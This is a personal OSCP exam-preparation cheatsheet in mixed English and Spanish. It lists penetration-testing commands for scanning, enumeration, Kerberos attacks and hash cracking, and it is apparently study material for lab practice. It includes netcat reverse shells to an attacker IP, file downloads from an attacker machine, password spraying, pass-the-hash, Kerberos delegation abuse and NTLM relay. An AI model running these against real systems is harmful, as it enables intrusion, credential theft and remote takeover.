# OSCP_Command_Cheatsheet

Just a handful of commands I normally use. There a lot of things that are missing, I will be updating this regularly as I keep learning/practicing new things.

Expect Spanglish, this is a cheatsheet. 

- [Misc Commands from Linux](#misc-commands-from-linux)
   - [Strings and files manipulation](#strings-and-files-manipulation)
   - [Some Netcat (nc, nc.exe, ncat) commands](#some-netcat-nc-ncexe-ncat-commands)
   - [Wireshark Filters and pcap related](#wireshark-filters-and-pcap-related)
   - [Basic AF git commands](#basic-af-git-commands)
   - [Remote Desktop](#remote-desktop)
   - [Transfer files to windows](#transfer-files-to-windows)
- [Port Scanning](#port-scanning)
- [Web Directory Scanning (and related)](#web-directory-scanning-and-related)
- [DNS Enumeration](#dns-enumeration)
- [Manually enumerate LDAP through Python console](#manually-enumerate-ldap-through-python-console)
- [SMB Enumeration](#smb-enumeration)
- [RPC Enumeration](#rpc-enumeration)
- [Kerberos Attacks](#kerberos-attacks)
- [Hascat, John and HashCracking related](#hascat-john-and-hashcracking-related)


## Misc Commands from Linux


### Strings and files manipulation

```
# Extract gz file
gunzip acces.log.gz

# Extract tar.gz file
tar -xzvf file.tar.gz

# Search for a string in command history
history | grep frase_a_buscar

# Count lines
wc -l index.html

 # Visualizar el principio/fin de un fichero	
head/tail index.html

# Find a search for a file that contains a specific string in it’s name
find / -name sbd\*

# Extraer todas las líneas que tienen una string 	
grep "href=" index.html

# Cortar una string por un delimitador, filtrar los resultados con grep y ordenarlos
grep "href=" index.html | cut -d "/" -f 3 | grep "\\." | cut -d '"' -f 1 | sort -u

# Sustituir una determinada cadena por otra
cat algo.txt | awk '{sub(/<cadena_a_sustituir>/,<cadena_a_introducir>);print}'

# Eliminar columna de un fichero de texto delimitada por un separador
cat algo.txt | awk -F: '{print $1":"$3}'

# Descodificar desde base64
echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode

# Codificar a base64
echo -n "algo" | base64

# Descodificar desde HEX
echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps

# Mostrar el contenido de un fichero usando grep y REGEX para filtrar
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt

# Ordenar por frecuencia y mostrar todas las IP's presentes en un fichero LOG
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn

```

[Back to top](#oscp_command-cheatsheet)

### Some Netcat (nc, nc.exe, ncat) commands 

```
# Conectarse a otro puerto en otro host
nc -nv <ip_address> 110

# Poner puerto a la escucha
nc -nlvp 4444

# Enviar un fichero usando netcat
nc -nv <ip_address> 444 < /usr/share/windows/nc.exe

# Recibir fichero con netcat
nc -lvpn 4444 > incoming_file.exe

# Bind Shell con netcat en windows
nc.exe -nlvp 3344 -e cmd.exe

# Reverse shell con netcat en windows
nc.exe -nv <attacker_IP_address> <PORT> -e cmd.exe

# Bind Shell con netcat en linux
nc.exe -nlvp 3344 -e /bin/bash

# Reverse shell con netcat en linux
nc -nv <attacker_ip_address> 44444 -e /bin/bash

# Bind shell from windows
ncat --exec cmd.exe --allow <attacker_ip> -vnl 4444 --ssl

# Listen on port 444 using ssl
ncat -v <attacker_ip_Address> 444 --ssl

```

[Back to top](#oscp_command-cheatsheet)

### Wireshark Filters and pcap related

```
# Filtro para mostrar trafico en puerto SMTP (25) y ICMP
tcp.port eq 25 or icmp

# Mostrar solo tráfico LAN (sin salida a Internet)
ip.src==192.168.0.0/16 and ip.dst==192.168.0.0/16

# Filtrar por protocolo (ejemplo SIP) y eliminar tráfico de IP's no deseadas
ip.src !=xxx.xxx.xxx.xxx && ip.dst != xxx.xxx.xxx.xxx && sip

# Mostrar un ficher pcap
tcpdump -r passwordz.pcap

# Mostrar solo IP's y ordenarlas
tcpdump -n -r passwordz.pcap | awk -F" " '{print $3}' | sort -u | head

# Capturar paquetes en el puerto 80
tcpdump tcp port 80 -w output.pcap -i eth0

```

[Back to top](#oscp_command-cheatsheet)

### Basic AF git commands

```
# Enumerar todos los archivos nuevos o modificados que se deben confirmar
git status

# Toma una instantánea del archivo para preparar la versión
git add [file]

# Mover el archivo del área de espera, pero preservar su contenido
git reset [file]

# Registra las instantáneas del archivo permanentemente en el historial de versión
git commit -m "[descriptive message]"

# Mostrar las diferencias de archivos que no se han enviado aún al área de espera
git diff

# Mostrar las diferencias del archivo entre el área de espera y la última versión del archivo
git diff --staged

# Enumerar el historial de la versión para la rama actual
git log

# Enumerar el historial de versión para el archivo, incluidos los cambios de nombre
git log --follow [file]

# Producir metadatos y cambios de contenido del commit especificado
 git show[commit]

# Cambia a la rama especificada y actualiza el directorio activo
git checkout <commit_hash>

# Establecer el nombre que desea esté anexado a sus transacciones de commit
git config --global user.name "[name]"

# Establecer el e-mail que desea esté anexado a sus transacciones de commit
git config --global user.email "[email address]"

# Habilitar la útil colorización del producto de la línea de comando
git config --global color.ui auto

```

[Back to top](#oscp_command-cheatsheet)

### Remote Desktop

```
# Using xfreerdp
 xfreerdp /u:'domain\user' /p:'Password' /v:host_ip:3389 (or another port if 3389 is not the case)

# Using rdekstop
rdesktop ip_address -k es -u user -p pass -d domain

```

[Back to top](#oscp_command-cheatsheet)

### Transfer files to windows

```
# En la máquina kali)
python -m http.server

# Con certutil
# En windows 
certutil.exe -f -urlcache -split http://ip_kali:8000/fichero fichero

# Con powershell
# En windows     
new-object net.webclient).DownloadFile('http://ip_kali:8000/fichero', 'fichero')      # Opción 1
powershell Invoke-WebRequest "http://ip_kali:8000/fichero" -OutFile "fichero"         # Opción 2

# A través de una carpeta compartida de mi kali
# Levantar servidor SMB con impacket-smbserver
impacket-smbserver -smb2support -user <loquequieras> -password 'loquequieras' nombre_deseado_share ruta_carpeta_a_compartir

# Conectarse desde windows
NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES

```

[Back to top](#oscp_command-cheatsheet)

## Port Scanning

This only contains what I normally use, there are more options available at [S4vitar - Preparación OSCP - Port Scanning](https://gist.github.com/s4vitar/b88fefd5d9fbbdcc5f30729f7e06826e#port-scanning)

```
# Puertos abiertos
sudo nmap -sS -p- --min-rate 10000 -oN hostnameOpenPorts hostname

# Servicios y versiones
map -sS -sV -O -sC --min-rate 1000 -p25,80,110,135,139,143,445,587,5985,47001 -oN hostnameServiceVersions hostname

```

[Back to top](#oscp_command-cheatsheet)

## Web Directory Scanning (and related)

```
# GoBuster
gobuster dir -u <URL> -w <wordlist> -x <desired_extensions> -k

# FeroxBuster (makes the search recursively)
feroxbuster -k -u <url> -x php -o <output> -w <wordlist>

# Parameter Fuzzing using ffuf
ffuf -w burp-parameter-names.txt -u http://domain.com/index.php?FUZZ=id -fw <numero de palabras en la respuesta legítima>

# Search for plugins in Wordpress Sites
ffuf -w Bug-Bounty-Wordlists/wp-plugins.txt-u http://domain.com/wp-content/plugins/FUZZ 

# IIS Short Name Scan (using 20 threads and showing progress)
java -jar iis_shortname_scanner.jar 2 20 http://example.com/folder/

# Shortscan (another option to scan 8.3 file names)
go/bin/shortscan http://url

```

[Back to top](#oscp_command-cheatsheet)

## DNS Enumeration

```
# Búsqueda d ehosts con Nmap
nmap -F --dns-server <dns server ip> <target ip range>

# Consulta DNS normal
dig A @nameserver_ip domain-name-here.com 

# Any information
dig ANY @<DNS_IP> <DOMAIN>    

# IPv6 DNS request
dig AAAA @<DNS_IP> <DOMAIN>    

# Information
dig TXT @<DNS_IP> <DOMAIN>

# Registros MX    
dig MX @<DNS_IP> <DOMAIN>

# ¿Qué DNS resuelve este nombre? 
dig NS @<DNS_IP> 

# Búsqueda inversa      
dig -x 192.168.0.2 @<DNS_IP>

# Búsqueda inversa IPv6
dig -x 2a00:1450:400c:c06::93 @<DNS_IP>

# Transferencia de Zona sin especificar nombre de dominio
dig axfr @<DNS_IP>

# Transferencia de zona especificandeo nombre de dominio
dig axfr  @<DNS_IP> <DOMAIN>

```

[Back to top](#oscp_command-cheatsheet)

## Manually enumerate LDAP through Python console

More LDAP search filters available at [Jonlabelle Gist](https://gist.github.com/jonlabelle/0f8ec20c2474084325a89bc5362008a7) 

```
>>> import ldap3
>>> server = ldap3.Server('x.X.x.X', get_info = ldap3.ALL, port =636, use_ssl = True)
>>> connection = ldap3.Connection(server) # Conexión anónima
>>> connection=ldap3.Connection(server, 'SVC_TGS', 'GPPstillStandingStrong2k18') # Conexión usando credenciales
>>>  connection.bind()
# El servidor devolverá True o False indicando si la conexión se ha realizado correctamente o no.
>>> server.info
# El servidor devolverá info del dominio
# A continuación incluyo algunas búsquedas útiles.
# Todos los objetos del dominio
>>> connection.search('dc=DOMAIN,dc=DOMAIN', '(objectclass=*)')
>>> connection.entries # Para ver los resultados de la búsqueda
# Todos los objetos del dominio y susu atributos
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(objectClass=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de usuarios AS_REProastables (no necesitan pre-autenticación de Kerberos) 
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de usuarios con servicios asociados (Para Kerberoasting)
>>> connection.search(search_base='DC=DOMAIN,DC=DOMAIN', search_filter='(&(samAccountType=805306368)(servicePrincipalName=*))', search_scope='SUBTREE', attributes='*')
>>> connection.entries
# Búsqueda de todos los atributos de un usuario
>>> connection.search(search_base='cn=users,dc=support,dc=htb',search_filter='(sAMAccountName=<username>)', search_scope='SUBTREE', attributes='*')
>>> connection.entries

```

[Back to top](#oscp_command-cheatsheet)

## SMB Enumeration

```
# Info Con Enum4Linux
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>

# Obtener Usuarios
crackmapexec smb <IP_address> --users [-u <username> -p <password>]

# Enumerar grupos
crackmapexec smb <IP_address> --groups --loggedon-users [-u <username> -p <password>]

# Enumerar shares (varias opciones)
crackmapexec smb 10.10.10.10 --shares [-u <username> -p <password>]
smbclient --no-pass -L //<IP>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>

# Conectarse a una share (varias opciones)
smbclient --no-pass //<IP>/<Folder>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP>/<Folder>
smbclient -U '%' -N \\\\<IP>\\<SHARE>
smbclient -U '<USER>' \\\\<IP>\\<SHARE>

# Montar una share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share

# Descargar toda una share
smbclient //<IP>/<share>
mask ""
recurse
prompt
mget *

# Hacer spidering de una share buscando un patrón concreto ("." como patrón)
crackmapexec smb <ip_Addres> -u '' -p '' --spider <nombre_share> --pattern "."

# Realizar ataque Password Spraying
crackmapexec smb <ip_address> -u <users_file> -p <password> --continue-on-success

# Ejecutar comandos
crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
crackmapexec smb 192.168.10.11 [-d Domain] -u Administrator -H <NTHASH> -x whoami

```

[Back to top](#oscp_command-cheatsheet)

## RPC Enumeration

```
# Conexión anónima (el resto de comandos son una vez se ha establecido la conexión)
rpcclient -U "" -N <IP_ADDRESS>

# Server Info
srvinfo

# Listar usuarios
querydispinfo
enumdomusers

# Info de un ususario
queryuser <0xrid>

# Grupos de un usuario
queryusergroups <0xrid>

# SID de un usuario
lookupnames <username>

# Alias de un usuario
queryuseraliases [builtin|domain] <sid>

# Listar grupos
enumdomgroups

# Información de un grupo
querygroup <0xrid>

# Miembros de un grupo
querygroupmem <0xrid>

# Listar alias de grupo
enumalsgroups <builtin|domain>

# Miembros del grupo por el alias
queryaliasmem builtin|domain <0xrid>

# Listar dominios
enumdomains

# SID del dominio
lsaquery

# Info del dominio
querydominfo

# Listar las shares
netshareenumall

# Info de una share
netsharegetinfo <share>

```

[Back to top](#oscp_command-cheatsheet)

## Kerberos attacks

Recomendado [Tarlogic - ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/#Kerberoasting)

Recomendado [The Hacker Recipes - Kerberos - Delegations](https://www.thehacker.recipes/ad/movement/kerberos/delegations)

```

# Fuerza bruta a kerberos	
kerbrute -domain <domai> -users <user_file> -passwords <password_file> -outputfile <output_file>

# ASrepRoast	
impacket-GetNPUsers.py <dominio>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# Kerberoast	
impacket-GetUserSPNs jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast

# Overpass The Hash/Pass The Key (PTK)	
impacket-getTGT <domain</<username> -hashes :<hash_value>
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
impacket-psexec <dominio>/<user>@servicio.domain.htb -k -no-pass

# Pass the Hash	
impacket-psexec -hashes "<hashes>" <username>@domain

# Buscar Delegación	
impacket-findDelegation domain/username:password

# Añadir pc al dominio	
impacket-addcomputer domain/username -hashes <hash> -computer-name <algo> -computer-pass <otro_algo> -dc-host <dc_hostname>

# Solicitar Service Ticket y usarlo	(Constrained Delegation with Protocol Transition)
impacket-getST -spn "cifs/target" -impersonate "administrator" domain/user -hashes <hash> # Este comando guarda el ticket en administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass

# Solicitar Service Ticket y usarlo	(Constrained Delegation without Protocol Transition)
impacket-getST -spn "cifs/serviceA" -impersonate "administrator" "domain/serviceB:password" # Este comando guarda el ticket en administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec intelligence.htb/administrator@dc.intelligence.htb -k -no-pass

#NTLM Relay Attack
sudo python /usr/local/bin/ntlmrelayx.py --no-http-server -smb2support -t <target_ip> -c "powershell -enc JABjAGwAaQ..."

```

[Back to top](#oscp_command-cheatsheet)

## Hascat, John and HashCracking related

```
# Hash detection using [Name-That-Hash](https://github.com/HashPals/Name-That-Hash)
nth -f hash_file --no-banner -a

# TGS cracking
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast

# AS_REP cracking
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt

# NetNTLMv2 hash cracking
hashcat -m 5600 -a 0 -r rules/best64.rule hashes rockyou.txt

# NTLM hash cracking
hashcat -m 1000 -a 0 -r rules/best64.rule hashes rockyou.txt

# MD5 hash cracking
 hashcat.exe -m 0 --user -a 0 userPassHashes.txt rockyou.txt (--user flag may be omitted, it indicates that the hash file's format is  username:<md5 hash>)

# Wordpress,phpass, Joomla MD5 hash cracking
john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt

# Cracking ID_RSA hash to obtain passphrase
ssh2john id_rsa >id_rsa.hash
john id_rsa.hash -w=rockyou.txt
hashcat -m 22911 -a 0 id_rsa.hash rockyou.txt   # $sshng$0$
hashcat -m 22921 -a 0 id_rsa.hash rockyou.txt   # $sshng$6$
hashcat -m 22931 -a 0 id_rsa.hash rockyou.txt   # $sshng$1$
hashcat -m 22941 -a 0 id_rsa.hash rockyou.txt   # $sshng$4$
hashcat -m 22951 -a 0 id_rsa.hash rockyou.txt   # $sshng$5$

# Yescrypt hash cracking
john --format=crypt hash.txt --wordlist:/your/wordlist/list.txt

```

[Back to top](#oscp_command-cheatsheet)


